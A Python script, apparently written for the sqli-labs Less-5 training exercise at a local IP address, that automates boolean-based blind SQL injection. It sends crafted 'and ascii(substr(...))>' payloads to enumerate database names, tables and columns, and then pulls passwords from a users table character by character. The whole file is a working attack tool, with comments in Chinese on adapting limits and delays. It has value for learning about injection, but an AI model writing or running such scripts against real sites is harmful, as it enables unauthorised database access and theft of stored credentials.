import sys
import time
import requests

url="http://192.168.80.134/sql/Less-5/index.php%s"
#猜有几个数据库
def database_how():
    for i in range(1,15):#如果你觉得你获取到的权限是数据库大于15个，那么直接就修改即可

        payload = "?id=1' and (select count(schema_name) from information_schema.schemata)>%s --+"
        p = payload % str(i)
        r = requests.get(url % p)
        time.sleep(1)#休眠1秒，没有waf的情况下这条可删除
        if 'You are in' in r.text:
            print('数据库数量超过'+str(i)+'个')
        else:
            print('数据库数量为:',i)
            break    
#database_how()

#查询所有数据库
def database_allName():
    payload="?id=1' and ascii(substr((select schema_name from information_schema.schemata limit 0,1),%s,1)) >%s --+"    #如果存在多个数据库，则可以更换limit的值来进行不同的注入查询如 limit 0，1 limit 1，1 limit 2，1
    #如果存在多个数据库，则可以更换limit的值来进行不同的查询如 limit 0，1 limit 1，1 limit 2，1
    allName=''
    print("开始查询你所指定的数据库名称...")
    for i in range(1,20):
        max=126    #~
        min=32    #空格
        while abs(max-min)>1: 
            mid=int((max+min)/2)
            if mid == 92:
                mid = mid -1
            p=payload % (str(i),str(mid))
        
            print(url % p)
            r = requests.get(url % p)
            #time.sleep(1)

            if 'You are in' in r.text:
                min=mid
            else:
                max=mid
        allName=allName+chr(max)
        print("当前查询的这个数据库名称为 :%s" % allName)
#database_allName()
   



#猜数据库名长度
def database_len():
    print("开始查询当前数据库名字长度")
    for i in range(1,15):
        payload = "?id=1' and length(database())>%s --+"
        p = payload % str(i)
        r = requests.get(url % p)
        #time.sleep(1)
        if 'You are in' in r.text:
            print('数据库名长度超过'+str(i)+'位')
        else:
            print('数据库名长度为:',i)
            break
database_len()


#当前默认数据库名称
def database_currentName():
    payload="?id=1' and ascii(substr(database(),%s,1))>%s --+"
    database=''
    print("开始查询当前默认数据库名称...")
    for i in range(1,9):
        max=126    #~
        min=32    #空格
        while abs(max-min)>1: 
            mid=int((max+min)/2)
            p=payload % (str(i),str(mid))
        
            print(url % p)
            r = requests.get(url % p)
            #time.sleep(1)

            if 'You are in' in r.text:
                min=mid
            else:
                max=mid
        database=database+chr(max)
        print("已猜出当前数据库名称 :%s" % database)
database_currentName()

#当前数据库的表名
def database_table():
    payload="?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),%s,1)) >%s --+"
    #如果存在多个数据库，则可以更换limit的值来进行不同的注入查询如 limit 0，1 limit 1，1 limit 2，1
    table=''
    print("开始查询你所指定的表的名字。。。")
    for i in range(1,20):
        max=126    #~
        min=32    #空格
        while abs(max-min)>1: 
            mid=int((max+min)/2)
            if mid == 92:
                mid = mid -1
            p=payload % (str(i),str(mid))
        
            print(url % p)
            r = requests.get(url % p)
            #time.sleep(1)

            if 'You are in' in r.text:
                min=mid
            else:
                max=mid
        table=table+chr(max)
        print("已猜出表名是 :%s" % table)
database_table()   
   

def database_columns():
    payload="?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 2,1),%s,1)) >%s --+"
    #如果存在多个数据库，则可以更换limit的值来进行不同的注入查询如 limit 0，1 limit 1，1 limit 2，1
    #这里的passwd是根据上面爆出来的表名
    table=''
    print("开始查询你所指定的字段的名字...")
    for i in range(1,20):
        max=126    #~
        min=32    #空格
        while abs(max-min)>1: 
            mid=int((max+min)/2)
            if mid == 92:
                mid = mid -1
            p=payload % (str(i),str(mid))
        
            print(url % p)
            r = requests.get(url % p)
            #time.sleep(1)

            if 'You are in' in r.text:
                min=mid
            else:
                max=mid
        table=table+chr(max)
        print("已猜出字段名字是 :%s" % table)
database_columns()  
    
def database_key():
    payload="?id=1' and ascii(substr((select password from  users limit 0,1),%s,1)) >%s --+"
    #如果存在多个数据库，则可以更换limit的值来进行不同的注入查询如 limit 0，1 limit 1，1 limit 2，1
    #这里的users是根据上面爆出来的表名，password是爆出来的字段
    table=''
    print("开始查询你所指定的数据...")
    for i in range(1,20):
        max=126    #~
        min=32    #空格
        while abs(max-min)>1: 
            mid=int((max+min)/2)
            if mid == 92:
                mid = mid -1
            p=payload % (str(i),str(mid))
        
            print(url % p)
            r = requests.get(url % p)
            #time.sleep(1)

            if 'You are in' in r.text:
                min=mid
            else:
                max=mid
        table=table+chr(max)
        print("已猜出你要查询的数据是 :%s" % table)
database_key()
